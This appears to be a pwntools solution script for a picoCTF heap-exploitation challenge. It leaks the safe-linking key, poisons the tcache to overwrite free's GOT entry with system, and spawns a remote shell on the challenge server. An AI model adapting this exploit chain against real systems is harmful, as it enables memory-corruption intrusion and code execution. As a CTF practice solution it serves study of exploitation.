from pwn import *

# p = process('./vuln')
p = remote('saturn.picoctf.net', 63361)
elf = ELF('./vuln')
lib = ELF('./libc.so.6')


def choice(id_):
    p.recvuntil(b'Choice:')
    p.sendline(id_)


def change(id_, mess, spot):
    choice(b'0')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)
    p.recvuntil(b'characters:')
    p.sendline(mess)
    p.recvuntil(b'New spot?')
    p.sendline(spot)


def add(id_, size_, mess):
    choice(b'1')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)
    p.recvuntil(b'Horse name length (16-256)?')
    p.sendline(size_)
    p.recvuntil(b'characters:')
    p.sendline(mess)


def delete(id_):
    choice(b'2')
    p.recvuntil(b'Stable index # (0-17)?')
    p.sendline(id_)


[add(str(i), b'23', b'a' * 23) for i in range(0, 5)]
delete(b'0')
add(b'17', b'23', b'\xff')

choice(b'3')
p.recvuntil(b'WINNER: ')
key = u16(p.recv(2))
print(hex(key))

add(b'14', b'24', b'a' * 31)
add(b'15', b'24', b'a' * 31)
delete(b'14')
delete(b'15')

free_got = elf.got['free'] - 0x18
payload = p64(free_got ^ key) + p64(0)
change(b'15', payload, b'16')

payload = b'/bin/sh\00' + b'\xff'
add(b'14', b'24', payload)
payload = p64(0) * 3 + p64(elf.sym['system'])
add(b'15', b'31', payload)
delete(b'14')

p.interactive()
